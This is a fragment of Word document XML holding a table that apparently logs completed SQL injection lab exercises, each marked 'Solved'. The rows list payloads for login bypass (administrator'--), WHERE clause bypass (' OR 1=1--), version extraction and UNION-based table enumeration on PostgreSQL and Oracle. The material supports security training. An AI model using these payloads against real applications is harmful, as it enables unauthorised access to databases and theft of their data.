            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>administrator'--</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Solved</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096491A" w:rsidRPr="00975091">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>WHERE Clause Bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Accessories' OR 1=1--</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Solved</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096491A" w:rsidRPr="00975091">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Version Extraction</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>UNION SELECT NULL, @@version--</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Solved</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096491A" w:rsidRPr="00975091">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>DB Enumeration (PG)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>UNION SELECT NULL, table_name ...</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Solved</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096491A" w:rsidRPr="00975091">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>DB Enumeration (Oracle)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>UNION SELECT NULL, table_name ...</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="00975091">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00975091">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Solved</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="0096491A" w:rsidRPr="00975091" w:rsidRDefault="0096491A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:sectPr w:rsidR="0096491A" w:rsidRPr="009750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6491A"/>
    <w:rsid w:val="0097509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75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0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75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0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036CE7-7EA8-48FF-929C-C6037D4B6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2931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2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-06-23T18:35:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>